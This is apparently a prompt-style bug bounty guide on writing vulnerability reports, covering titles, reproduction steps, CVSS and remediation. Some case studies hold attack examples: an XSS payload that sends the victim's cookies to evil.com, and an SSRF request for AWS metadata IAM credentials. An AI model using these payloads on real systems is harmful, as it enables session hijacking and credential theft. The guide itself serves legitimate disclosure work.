# 01 — Report Structure Optimization for Bug Bounty

## Expert Role (15 Lines)

You are a senior bug bounty triager with 10+ years of experience reviewing thousands of vulnerability reports across HackerOne, Bugcrowd, and Intigriti. You have seen every possible report format — from disorganized wall-of-text submissions to meticulously structured masterpieces that get triaged in under 5 minutes. You understand that the structure of a report is not just cosmetic; it directly determines whether a triager can validate the finding, whether it gets accepted or marked N/A, and whether the severity stays at the submitted level or gets downgraded. Your expertise spans report anatomy optimization, triage psychology, information hierarchy, and the subtle art of presenting technical findings in a way that minimizes friction between reporter, triager, and program owner. You know that a poorly structured report with a valid bug can be rejected simply because the triager could not reproduce it, while a well-structured report with the same bug gets fast-tracked to bounty payout. This guide encodes everything you have learned about making reports impossible to reject.

## Core Concepts (40 Lines)

### Report Anatomy — The Non-Negotiable Components

Every accepted bug bounty report contains these sections in some form:

1. **Title** — One line that tells the triager exactly what the bug is and what it affects
2. **Summary** — 2-4 sentence overview: what, where, impact, who is affected
3. **Severity** — Your CVSS assessment with justification
4. **Description** — Technical explanation of the vulnerability root cause
5. **Impact** — Business impact, data exposure, user impact
6. **Steps to Reproduction** — Numbered, exact, reproducible steps
7. **Remediation** — What the fix should be
8. **Supporting Material** — PoC, screenshots, video, code samples

### Title Formulation Best Practices

The title is the single most important element. It determines:
- Whether the triager opens the report at all
- Initial severity impression
- Searchability for duplicate detection
- Program owner's first impression

**Good titles are:**
- Specific: "Stored XSS in profile bio field via unsanitized rich text input"
- Impactful: "IDOR allows reading any user's private messages (4M+ users affected)"
- Actionable: "SSRF in image import endpoint leaks AWS IAM credentials"
- Non-vague: NOT "Security vulnerability found" or "Bug in your application"

**Title formula:** `[Vulnerability Type] in [Specific Location] allows [Impact]`

**Examples:**
- `Stored XSS in /settings/profile via company name field allows session hijacking`
- `IDOR in /api/v2/messages/{id} returns any user's private messages`
- `SSRF in /import/url endpoint reads internal AWS metadata endpoint`
- `Privilege escalation via /api/admin/users endpoint accessible to regular users`
- `Account takeover via password reset token exposed in Referer header to third-party scripts`

### Report Length Optimization

**Concise (preferred for simple bugs):** 100-300 words
- Simple IDOR, reflected XSS, missing auth
- Clear steps, minimal context needed

**Comprehensive (needed for complex chains):** 500-1500 words
- Business logic flaws
- Multi-step attack chains
- Chained vulnerabilities
- Race conditions with complex timing

**Avoid:**
- Walls of text without formatting
- Repeating the same information across sections
- Including irrelevant background information
- Unnecessary technical jargon that adds no clarity

### Section Ordering for Maximum Impact

The order you present information controls the triager's attention:

```
1. Title              → Hooks attention, sets context
2. Summary            → Confirms understanding, states impact
3. Severity           → Frames the finding as serious
4. Steps to Reproduce → Enables validation (triager does this FIRST)
5. Description        → Explains WHY it works (root cause)
6. Impact             → Quantifies damage (business context)
7. Remediation        → Shows professionalism, aids fixing
8. Supporting Material→ Evidence backing your claims
```

**Why this order works:**
- Triagers validate first, understand second
- Putting reproduction steps early means triagers don't have to hunt for them
- Impact after reproduction means they've seen the bug work before you quantify damage
- Remediation at the end shows you care about the fix, not just the bounty

### Information Hierarchy Principles

**Level 1 — What the triager needs to know RIGHT NOW:**
- Title, severity, reproduction steps

**Level 2 — What they need to UNDERSTAND the bug:**
- Description, root cause, technical details

**Level 3 — What they need to JUSTIFY the bounty:**
- Impact quantification, business context, user numbers

**Level 4 — What they need to FIX the bug:**
- Remediation, code-level guidance, architecture suggestions

**Level 5 — What they need as EVIDENCE:**
- Screenshots, video, code samples, curl commands

### Report Structure by Vulnerability Type

#### IDOR Reports
```
Title: IDOR in [endpoint] allows [access type] of [resource type]
Summary: [N] users affected, [data type] exposed
Steps:
1. Login as user A
2. Note user A's resource ID
3. Replace with user B's resource ID in request
4. Observe user B's data returned
Impact: [N] users' [data type] accessible to any authenticated user
```

#### XSS Reports
```
Title: [Stored/Reflected/DOM] XSS in [field/parameter] via [input type]
Summary: Payload executes in victim's browser, allows [impact]
Steps:
1. Navigate to [location]
2. Input [payload] in [field]
3. Submit form
4. Observe script execution in [context]
Impact: Session hijacking, credential theft, [specific impact]
```

#### SSRF Reports
```
Title: SSRF in [endpoint] allows access to [internal resource]
Summary: Can reach [internal service], [N] internal endpoints accessible
Steps:
1. Navigate to [endpoint]
2. Set URL parameter to [internal URL]
3. Observe [internal data] returned
Impact: [Internal service] access, [credential/data] exposure
```

#### RCE Reports
```
Title: RCE via [vector] in [endpoint/component]
Summary: Arbitrary command execution as [user/privilege]
Steps:
1. [Setup requirements]
2. [Execution steps]
3. Observe command output
Impact: Full server compromise, [data] access, lateral movement possible
```

#### Auth Bypass Reports
```
Title: Authentication bypass via [technique] in [flow/endpoint]
Summary: Access protected functionality without valid credentials
Steps:
1. Access [protected endpoint] without auth
2. Observe [protected content/functionality] accessible
Impact: [Sensitive data] exposure, [privileged action] execution
```

### Triage-Friendly Formatting

**Numbered steps are mandatory** — Never use paragraphs for reproduction steps
**One action per step** — Don't combine multiple actions in a single step
**Bold critical values** — Highlight URLs, parameters, payload values
**Use code blocks for** — URLs, request/response data, payloads, command output
**Separate setup from execution** — "Pre-requisites" section for complex setups
**Include timestamps** — For race conditions, session-based bugs, time-sensitive issues

## Prerequisites (20 Lines)

1. Understanding of the target application's architecture and tech stack
2. Familiarity with the platform's report format (HackerOne, Bugcrowd, Intigriti)
3. Knowledge of CVSS 3.1 scoring methodology
4. Understanding of common vulnerability classes and their exploitation paths
5. Access to Burp Suite or equivalent proxy tool for request capture
6. Knowledge of HTTP protocol, request/response structure
7. Understanding of authentication and session management mechanisms
8. Familiarity with JavaScript, HTML, and browser security model
9. Understanding of server-side languages and frameworks (Node.js, Python, PHP, Java)
10. Knowledge of common WAF patterns and how they affect reproduction
11. Understanding of rate limiting and how to document rate-limited bugs
12. Familiarity with OWASP Top 10 and CWE classification
13. Understanding of business impact vs technical impact distinction
14. Knowledge of common false positive patterns to avoid
15. Understanding of scope rules and out-of-scope exclusions
16. Familiarity with responsible disclosure timelines and coordination
17. Understanding of how triagers evaluate reports (time constraints, volume)
18. Knowledge of common report rejection reasons and how to prevent them
19. Understanding of program-specific bounty tables and severity mappings
20. Familiarity with platform-specific features (HackerOne PII redaction, Bugcrowd VRT)

## Methodology (60 Lines)

### Phase 1: Pre-Writing Analysis

**Step 1: Classify the vulnerability**
- What class does this fall into? (OWASP, CWE, custom)
- Is this a standalone bug or part of a chain?
- What is the minimum required exploitation complexity?
- What prerequisites must an attacker meet?

**Step 2: Determine scope impact**
- Does this affect in-scope assets only?
- Are there out-of-scope exclusions this might trigger?
- Is this a duplicate of a known issue?
- Does this fall within the program's policy?

**Step 3: Assess severity before writing**
- What is the worst-case scenario exploitation?
- How many users/systems are affected?
- What data types are at risk?
- What is the exploitation complexity?

### Phase 2: Title Crafting

**Step 1: Identify the vulnerability class**
Start with the technical classification: IDOR, XSS, SSRF, RCE, etc.

**Step 2: Identify the location**
Specify the exact endpoint, field, parameter, or component

**Step 3: Identify the impact**
State what the attacker gains: data access, privilege escalation, code execution

**Step 4: Combine into title**
Format: `[Vuln Type] in [Location] allows [Impact]`

**Step 5: Refine for clarity and impact**
- Remove unnecessary words
- Ensure specificity without being verbose
- Verify the title is accurate (no exaggeration)
- Check it passes the "so what?" test

### Phase 3: Summary Construction

**Step 1: State the what**
"In [endpoint/feature], a [vulnerability type] vulnerability allows [attacker action]"

**Step 2: State the where**
"This affects [N] users/[specific user group] using [feature]"

**Step 3: State the impact**
"This could lead to [impact], affecting [scope of damage]"

**Step 4: State the fix**
"The root cause is [technical cause], which can be remediated by [general approach]"

### Phase 4: Severity Justification

**Step 1: Calculate CVSS vector**
Use the CVSS 3.1 calculator with accurate metrics

**Step 2: Justify each metric choice**
Explain why you chose each CVSS component value

**Step 3: Provide business context**
Translate technical severity to business impact

**Step 4: Address potential counterarguments**
Anticipate why severity might be disputed and preemptively address

### Phase 5: Steps to Reproduction

**Step 1: Document prerequisites**
- Account requirements (role, permissions)
- Tool requirements (Burp Suite, browser, specific software)
- Setup requirements (specific configuration, test data)

**Step 2: Write numbered steps**
- One atomic action per step
- Include exact URLs with parameter values
- Specify exact input values and expected outputs
- Include request/response data where critical

**Step 3: Add conditional branches**
"If [condition], then [alternative step]"
"Note: [important detail about timing/state]"

**Step 4: Include expected vs actual behavior**
"Expected: [what should happen]"
"Actual: [what actually happens]"

**Step 5: Add validation proof**
"Note the following in the response: [specific indicators of success]"

### Phase 6: Impact Documentation

**Step 1: Technical impact**
What can an attacker technically achieve? Data access, code execution, etc.

**Step 2: Business impact**
What does this mean for the business? Revenue loss, reputation damage, legal liability.

**Step 3: User impact**
How many users are affected? What data of theirs is at risk?

**Step 4: Compliance impact**
Does this violate GDPR, HIPAA, PCI-DSS, or other regulations?

**Step 5: Scenario description**
Walk through a realistic attack scenario that a non-technical stakeholder can understand

### Phase 7: Remediation Guidance

**Step 1: Identify the root cause**
What specific code/configuration/design flaw enables this?

**Step 2: Provide specific fix**
Not "validate input" but "implement server-side UUID comparison for resource access"

**Step 3: Suggest defense-in-depth**
Additional measures beyond the immediate fix

**Step 4: Reference standards**
Link to OWASP, CWE, or platform-specific guidance

### Phase 8: Supporting Material

**Step 1: Screenshots**
Annotated screenshots showing each step of reproduction

**Step 2: Request/Response data**
Raw HTTP request and response for Burp Suite users

**Step 3: Code samples**
Minimal code demonstrating the vulnerability if applicable

**Step 4: Video (optional)**
Screen recording for complex multi-step reproductions

**Step 5: Tool output**
Relevant output from security tools (nuclei, sqlmap, custom scripts)

### Phase 9: Review and Refinement

**Step 1: Read from triager's perspective**
Can someone unfamiliar with this target reproduce the bug from your report?

**Step 2: Verify all claims**
Every impact statement must be backed by evidence

**Step 3: Check for exaggeration**
Never overstate impact — it destroys credibility

**Step 4: Proofread**
Grammar and spelling errors reduce perceived professionalism

**Step 5: Platform-specific formatting**
Verify the report renders correctly on the submission platform

## Tool Arsenal (40 Lines)

### Essential Report Writing Tools

| Tool | Purpose | When to Use |
|------|---------|-------------|
| Burp Suite | Request capture and replay | Every report — capture raw HTTP data |
| Chrome DevTools | Browser-side analysis | XSS, CSRF, client-side vulnerabilities |
| Postman | API testing and documentation | API-focused vulnerabilities |
| Markdown editors | Report formatting | All reports — proper formatting |
| Screen recorders | Video documentation | Complex multi-step reproductions |
| Screenshot tools | Visual evidence | All reports — annotated screenshots |
| CVSS calculators | Severity scoring | Every report — accurate severity |
| Text diff tools | Comparing responses | IDOR, access control bugs |
| URL encoders/decoders | Payload crafting | XSS, SSRF, injection bugs |
| JWT.io | Token analysis | Auth bypass, JWT vulnerabilities |

### Report Writing Utilities

| Tool | Purpose | Command/Usage |
|------|---------|---------------|
| httpie | Clean HTTP requests | `http GET url Authorization:"Bearer token"` |
| jq | JSON formatting | `echo '{"key":"val"}' \| jq .` |
| curl | Request documentation | `curl -v -X POST url -d 'data'` |
| python requests | PoC development | Write minimal repro scripts |
| markdown-lint | Report formatting check | Validate markdown syntax |
| Grammarly | Writing quality check | Grammar and clarity review |

### Evidence Capture Tools

| Tool | Purpose | Best For |
|------|---------|----------|
| Burp Suite Repeater | Request modification | Testing variations quickly |
| Burp Suite Proxy | Traffic capture | Full request/response logging |
| Chrome Network tab | Browser requests | Client-side vulnerability evidence |
| mitmproxy | Proxy with scripting | Complex capture scenarios |
| Wireshark | Network analysis | Protocol-level vulnerabilities |
| ffuf | Fuzzing output | Directory/parameter discovery |

### Documentation Platforms

| Platform | Report Format | Key Features |
|----------|---------------|--------------|
| HackerOne | Markdown | PII redaction, structured fields |
| Bugcrowd | VRT-aligned | Category-based submission |
| Intigriti | Markdown | Flexible formatting |
| Immunefi | Crypto-focused | On-chain evidence support |
| Self-hosted | Custom | Full control over format |

## Case Studies (50 Lines)

### Case Study 1: IDOR in SaaS Platform — Structure That Got $5,000

**Initial Report (Rejected):**
```
Title: Bug in API
Description: I found that I can access other users' data by changing the ID
in the URL. This is bad because users should not see each other's data.
Steps: Change the ID to other numbers and you can see their data.
```
Result: Rejected as "insufficient information to reproduce"

**Rewritten Report (Accepted, $5,000):**
```
Title: IDOR in /api/v2/organizations/{orgId}/members allows reading any
organization's member PII (email, phone, address) — 12,000+ orgs affected

Summary: Authenticated users can access any organization's member data by
modifying the orgId parameter. This exposes PII (emails, phone numbers,
home addresses) for approximately 450,000 users across 12,000 organizations.

Severity: CVSS 3.1: 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

Steps to Reproduce:
1. Login as a regular user (user A) belonging to Organization A
2. Navigate to https://target.com/api/v2/organizations/[ORG-A-ID]/members
3. Note the response contains Organization A's member list with PII
4. Replace [ORG-A-ID] with [ORG-B-ID] (any other organization's ID)
5. Send the request with the same authentication headers
6. Response returns Organization B's complete member list with PII

Impact:
- 450,000+ users' PII exposed across 12,000 organizations
- Emails, phone numbers, and home addresses accessible
- GDPR violation (personal data breach)
- Potential for targeted phishing, doxxing, identity theft

Remediation:
- Implement organization-scoped authorization check on the /members endpoint
- Verify the authenticated user belongs to the requested organization
- Consider implementing UUID-based org identifiers instead of sequential IDs
```

### Case Study 2: XSS Report That Stayed at Critical Severity

**Weak Report (Downgraded from Critical to Medium):**
```
Title: XSS vulnerability
Description: I found XSS in your search page. When I put a script tag in the
search box, it executes. Here is the payload: <script>alert(1)</script>
```
Result: Downgraded to Medium because impact was not demonstrated

**Strong Report (Stayed at Critical):**
```
Title: Stored XSS in /search/recent allows session hijacking for all users
viewing search history — 50,000+ daily active users

Impact-First Summary: An attacker can inject persistent JavaScript into the
search history feature that executes for any user viewing their recent
searches. This allows session token theft, enabling complete account takeover
without user interaction beyond viewing search results.

Attack Scenario:
1. Attacker searches for: <img src=x onerror="fetch('https://evil.com/steal?t='+document.cookie)">
2. This payload is stored in the search history feature
3. When ANY user (including admins) views their recent searches page
4. The payload executes, exfiltrating their session cookie to attacker's server
5. Attacker uses stolen session to access victim's account

Business Impact:
- 50,000+ daily active users can be targeted
- Session hijacking enables account takeover without password
- Admin accounts are also vulnerable (no role-based filtering)
- Stored nature means payload persists across sessions
- No user interaction required beyond viewing search results
```

### Case Study 3: SSRF Report — Complexity Without Overwhelm

**The Problem:** SSRF report needed to demonstrate internal network access without exposing internal infrastructure details that could be flagged as out-of-scope.

**Solution:**
```
Title: SSRF in /api/import/url endpoint allows reading internal AWS
metadata service (169.254.169.254)

Technical Detail (Brief):
The endpoint fetches user-provided URLs server-side without validation.
Internal services are accessible including AWS instance metadata.

Proof of Concept:
Request:
POST /api/import/url HTTP/1.1
Host: target.com
Cookie: session=[REDACTED]

{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

Response (excerpt):
{
  "status": "success",
  "data": {
    "content": "ec2-instance-role\n"
  }
}

Impact:
- Access to AWS IAM credentials for the EC2 instance role
- Potential for AWS API access with the instance's permissions
- Internal network reconnaissance possible
- No authentication required beyond valid session
```

### Case Study 4: Business Logic Flaw — Writing for Non-Technical Audience

**The Challenge:** A discount code abuse vulnerability that required explaining coupon stacking logic to non-technical triagers.

**Solution — Lead with Business Impact:**
```
Title: Discount code stacking allows purchasing any product for $0.01 —
$50,000+ in potential revenue loss

Business Impact Statement:
A vulnerability in the checkout system allows unlimited discount codes to
be stacked on a single order. An attacker could:
1. Generate 1,000 discount codes (10% off each) using the public promo feature
2. Apply all 1,000 codes to a single order
3. Receive 100,000% discount (effectively unlimited)
4. Purchase any product for $0.01

This has been confirmed working on a $2,499 product, reducing it to $0.01.
At scale, this represents $50,000+ in potential revenue loss per day.

Technical Root Cause:
The checkout API endpoint /api/checkout/apply-discount does not limit the
number of discount codes per order. Each code is validated independently
and applied cumulatively without checking for conflicts or limits.

Remediation:
- Implement maximum discount code limit per order (recommended: 1)
- Add server-side validation to prevent negative totals
- Implement rate limiting on discount code generation per user
```

### Case Study 5: Auth Bypass — Precision Over Volume

**Initial Report (Too verbose, 1,500 words):**
Tried to document every possible auth bypass variant, overwhelming the triager.

**Focused Report (300 words, accepted):**
```
Title: Password reset token valid for 7 days (policy states 1 hour) —
extends attacker window by 168x

Summary: The password reset token expiration is set to 7 days in the
email template, contradicting the 1-hour expiration enforced elsewhere
in the application. This extends the window for token interception
from 1 hour to 7 days.

Steps to Reproduce:
1. Request password reset for any account
2. Observe the reset link in the email contains the token
3. The token remains valid when used 7 days later (tested: requested
   on Monday, used successfully the following Monday)
4. Compare with the login session timeout (1 hour) — inconsistency

Impact:
- Attacker has 7 days to intercept the reset token (vs intended 1 hour)
- Token can be intercepted via: email compromise, browser history,
  server log exposure, Referer header leakage
- Combined with other vulnerabilities, this significantly increases
  account takeover probability

CVSS 3.1: 6.5 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N)
- Note: This is higher than the standard reflected XSS because the
  attack window is measured in days, not milliseconds
```

## Advanced Techniques (40 Lines)

### Progressive Disclosure Strategy

**Level 1 — Title and Summary (5-second read):**
The triager should understand the bug in 5 seconds from the title alone.

**Level 2 — Steps and Impact (30-second read):**
Complete reproduction steps and quantified impact.

**Level 3 — Technical Details (2-minute read):**
Root cause analysis, exploitation mechanics, edge cases.

**Level 4 — Supporting Evidence (5-minute read):**
Full request/response, code analysis, video walkthrough.

**Level 5 — Deep Technical (optional, 10-minute read):**
Complete exploitation chain, alternative attack vectors, related findings.

### The "Triage Time Budget" Concept

Triagers spend an average of 5-15 minutes per report:
- 1 minute: Read title and summary
- 2 minutes: Attempt reproduction
- 2 minutes: Evaluate impact
- 3 minutes: Determine severity
- 2 minutes: Check for duplicates
- 3 minutes: Write response

Your report must be optimized for this time budget.

### Anti-Patterns That Kill Reports

**Anti-Pattern 1: The Wall of Text**
- 500 words without formatting
- No numbered steps
- No code blocks
- Result: Triager cannot find reproduction steps

**Anti-Pattern 2: The Vague Title**
- "Security issue found"
- "Bug in your application"
- "Vulnerability discovered"
- Result: Low priority triage queue

**Anti-Pattern 3: The Impact Overstatement**
- "This vulnerability could destroy your entire company"
- "All your users' data is compromised"
- Result: Loss of credibility, severity downgrade

**Anti-Pattern 4: The Missing Steps**
- "The vulnerability is in the API endpoint"
- "Just change the ID parameter"
- Result: Cannot reproduce, rejected

**Anti-Pattern 5: The Wall of Code**
- Entire exploit script without explanation
- No context for what the code does
- Result: Triager cannot understand the bug

### The "Inverted Pyramid" for Security Reports

Borrowed from journalism, this structure places the most important information first:

1. **Lead paragraph** (Summary): Who, what, when, where, why
2. **Essential details** (Steps): How to reproduce
3. **Supporting details** (Impact): Why it matters
4. **Background** (Description): Root cause analysis
5. **Supplementary** (Remediation): How to fix

### Report Scoring Framework

Use this internal checklist to evaluate your report before submission:

| Element | Score (1-5) | Weight | Purpose |
|---------|-------------|--------|---------|
| Title clarity | 5 | 15% | First impression |
| Reproduction completeness | 5 | 25% | Triager can validate |
| Impact quantification | 5 | 20% | Bounty justification |
| Technical accuracy | 5 | 20% | Credibility |
| Supporting evidence | 5 | 10% | Proof backing claims |
| Remediation quality | 5 | 10% | Professionalism |

**Target: 4.5+ weighted average before submission**

## Detection Patterns (20 Lines)

### Report Quality Red Flags

**Flag 1: Triager asks for clarification**
- Your report lacks specificity
- Steps were ambiguous
- Impact was unclear

**Flag 2: Triager cannot reproduce**
- Missing prerequisites
- State-dependent steps not documented
- Race conditions not explained

**Flag 3: Severity dispute**
- You overclaimed impact
- You underclaimed impact
- Missing business context

**Flag 4: Duplicate found**
- Report was not searchable
- Similar bug reported by another hunter
- You did not check existing reports

**Flag 5: Scope objection**
- Bug affects out-of-scope asset
- You targeted excluded functionality
- Impact does not align with program policy

### Self-Assessment Checklist

Before submitting, verify:
- [ ] Title contains vulnerability type, location, and impact
- [ ] Summary is 2-4 sentences maximum
- [ ] Steps are numbered and one action per step
- [ ] Every impact claim has evidence
- [ ] CVSS score is calculated, not guessed
- [ ] Screenshots are annotated with callouts
- [ ] Request/response data is formatted in code blocks
- [ ] Remediation is specific, not generic
- [ ] Report renders correctly on the platform
- [ ] No PII is exposed in screenshots or code samples

## Impact Assessment (20 Lines)

### Impact Categories and Documentation

**Confidentiality Impact:**
- What data is exposed?
- How many records/users?
- Is the data sensitive (PII, financial, health)?
- Can the data be used for further attacks?

**Integrity Impact:**
- Can an attacker modify data?
- What data modifications are possible?
- Are modifications reversible?
- Can modifications affect other users?

**Availability Impact:**
- Can an attacker cause denial of service?
- Is the DoS targeted or widespread?
- What is the recovery time?
- Are there cascading effects?

**Financial Impact:**
- Direct revenue loss?
- Cost of incident response?
- Regulatory fines?
- Reputation damage?

### Impact Multipliers

Factors that increase impact:
- No authentication required
- No user interaction required
- Affects admin/privileged users
- Affects multiple tenants
- Persistent/stored nature
- Affects production data
- No rate limiting on exploitation
- Chained with other vulnerabilities

## Pitfalls (25 Lines)

### Common Report Writing Mistakes

**Mistake 1: Writing for yourself, not the triager**
You already understand the bug. The triager does not.

**Mistake 2: Assuming technical knowledge**
Not every triager knows every framework, library, or protocol.

**Mistake 3: Exaggerating impact**
One false claim destroys all credibility.

**Mistake 4: Omitting prerequisites**
"If the attacker already has access to..." — state this clearly.

**Mistake 5: Using vague language**
"Sometimes it works" → Document the exact conditions.

**Mistake 6: Forgetting to redact PII**
Other users' data must be anonymized.

**Mistake 7: Not testing your own reproduction steps**
Follow your steps exactly as written before submitting.

**Mistake 8: Writing the report immediately**
Take notes during testing, write the report later with fresh perspective.

**Mistake 9: Ignoring platform-specific formatting**
HackerOne markdown ≠ generic markdown.

**Mistake 10: Not accounting for WAF/firewall**
Document that testing was done with security controls disabled or bypassed.

### Report Rejection Prevention

**Prevention 1: Check existing reports**
Search the platform for similar findings before writing.

**Prevention 2: Verify scope**
Confirm the affected asset is in scope.

**Prevention 3: Test in clean environment**
Ensure no cached sessions or stored XSS payloads from previous testing.

**Prevention 4: Document your testing environment**
Browser version, OS, tools used, proxy configuration.

**Prevention 5: Include version information**
If version-specific, document the exact version tested.

## Integration Points (25 Lines)

### Report as Part of Hunter Toolkit

Your report structure should integrate with:
- **Note-taking system** — Capture findings in structured format during testing
- **Tool output processing** — Convert tool output to report-ready format
- **Template library** — Maintain templates for common vulnerability types
- **Submission checklist** — Pre-submission quality gate

### Platform Integration

**HackerOne:**
- Uses markdown with some HTML allowed
- Structured fields (title, severity, weakness, impact)
- PII redaction built-in
- Reference field for related reports

**Bugcrowd:**
- VRT (Vulnerability Rating Taxonomy) alignment
- Structured vulnerability submission
- Severity tied to VRT category
- Crowdstream for report updates

**Intigriti:**
- Flexible report format
- Custom severity justification
- Extended testing allowed
- Community voting on reports

### Continuous Improvement

After each report:
1. Track whether it was accepted or rejected
2. Note any feedback from triagers
3. Document what worked and what didn't
4. Update your templates based on learnings
5. Build a library of successful report structures

## Reporting Best Practices (20 Lines)

### Pre-Submission Checklist

- [ ] Title follows the formula: `[Vuln] in [Location] allows [Impact]`
- [ ] Summary is under 100 words
- [ ] Severity is justified with CVSS vector
- [ ] Steps are numbered and reproducible
- [ ] Impact is quantified with numbers
- [ ] Remediation is specific and actionable
- [ ] Screenshots are annotated
- [ ] Request/response data is formatted
- [ ] PII is redacted
- [ ] Report passes the "so what?" test

### Post-Submission Practices

- Monitor for triager questions
- Respond within 24 hours
- Provide additional information quickly
- Do not argue about severity (provide evidence instead)
- Thank the triager for their time

## Hands-On Labs (20 Lines)

### Lab 1: Title Optimization
Take this title and improve it:
- Original: "Found a bug in the API"
- Target: Write 3 better versions using the formula

### Lab 2: Steps to Reproduce
Write reproduction steps for this scenario:
- Bug: Password reset token is guessable (6-digit numeric)
- Test it yourself and document the exact steps
- Include request/response data

### Lab 3: Impact Quantification
For a reflected XSS in a banking application:
- Calculate the CVSS 3.1 score
- Write a 3-sentence business impact statement
- Identify the compliance implications

### Lab 4: Report Structure
Write a complete report for this scenario:
- IDOR in /api/users/{id}/settings exposes email preferences
- 50,000 users affected
- No authentication required beyond any valid session

### Lab 5: Peer Review
Exchange reports with a fellow hunter:
- Can they reproduce from your steps alone?
- Do they agree with your severity?
- Is the impact clear and quantified?

### Lab 6: Anti-Pattern Identification
Review these 3 reports and identify all structural problems:
- Report A: Wall of text, no formatting
- Report B: Vague title, missing steps
- Report C: Overstated impact, no evidence

### Lab 7: Platform-Specific Formatting
Write the same report for:
- HackerOne (markdown, structured fields)
- Bugcrowd (VRT-aligned)
- Intigriti (flexible format)

### Lab 8: Title A/B Testing
For the same vulnerability, write 5 different titles:
- Evaluate which one is most compelling
- Consider what each communicates to the triager
- Choose the winner and justify your choice

## Ethics and Professional Standards (15 Lines)

### Ethical Report Writing Principles

1. **Accuracy** — Never exaggerate or fabricate impact
2. **Completeness** — Provide enough information for validation
3. **Honesty** — Disclose any limitations in your testing
4. **Proportionality** — Severity must match actual impact
5. **Respect** — Treat triagers as professionals, not adversaries

### Legal Considerations

- Only test within program scope
- Do not access other users' real data without authorization
- Document testing methodology for legal protection
- Do not store or transmit sensitive data found during testing
- Follow responsible disclosure timelines

### Professional Reputation

- Consistent quality builds trust with programs
- Accurate severity builds credibility with triagers
- Detailed reports build reputation with platforms
- Professional communication builds long-term relationships
- Ethical behavior sustains a career in bug bounty

## Cheat Sheet (20 Lines)

### Quick Report Structure

```
TITLE: [Vuln Type] in [Location] allows [Impact]

SEVERITY: CVSS 3.1: [Score] ([Vector])

STEPS TO REPRODUCE:
1. [Action 1]
2. [Action 2]
3. [Action 3]
4. Observe [result]

IMPACT:
- [Quantified impact]
- [Business context]
- [Compliance implications]

REMEDIATION:
- [Specific fix]
- [Defense-in-depth]

EVIDENCE:
- [Screenshots]
- [Request/response]
- [Code samples]
```

### Title Formula Cheat Sheet

| Vulnerability | Title Format |
|---------------|-------------|
| IDOR | IDOR in [endpoint] allows [access] of [resource] |
| XSS | [Type] XSS in [location] via [input] allows [impact] |
| SSRF | SSRF in [endpoint] allows [access] to [internal resource] |
| RCE | RCE via [vector] in [component] as [privilege] |
| Auth Bypass | Auth bypass via [technique] allows [unauthorized action] |
| SQLi | [Type] SQLi in [parameter] allows [data access] |
| CSRF | CSRF in [action] allows [attacker action] on behalf of [victim] |
| Business Logic | [Logic flaw] in [feature] allows [abuse] resulting in [impact] |

### Severity Quick Reference

| Score | Severity | When to Use |
|-------|----------|-------------|
| 9.0-10.0 | Critical | RCE, full auth bypass, mass data exposure |
| 7.0-8.9 | High | Significant data access, privilege escalation |
| 4.0-6.9 | Medium | Limited data access, stored XSS, CSRF |
| 0.1-3.9 | Low | Information disclosure, minor issues |

### Before Submission Checklist

- [ ] Title is specific and actionable
- [ ] Summary is under 100 words
- [ ] Steps are numbered and complete
- [ ] Impact is quantified
- [ ] Severity is justified
- [ ] Remediation is specific
- [ ] Evidence is annotated
- [ ] PII is redacted
- [ ] Report is proofread
- [ ] You tested your own reproduction steps

## References and Resources

1. HackerOne Report Writing Guide
2. Bugcrowd University — Report Writing
3. CVSS 3.1 Specification (FIRST.org)
4. OWASP Vulnerability Reporting Guidelines
5. PTES (Penetration Testing Execution Standard) — Reporting
6. NIST SP 800-115 — Technical Guide to Information Security Testing
7. CWE/SANS Top 25 Most Dangerous Software Weaknesses
8. HackerOne Hacktivity — Study accepted reports for patterns
9. Bugcrowd Knowledge Base — VRT reference
10. Intigriti Blog — Report writing best practices

---

*This guide is part of the Report-Writing-Mastery series. Each module builds on the previous to create a comprehensive report writing skill set. Practice with real-world scenarios and iterate on your reports based on triager feedback.*
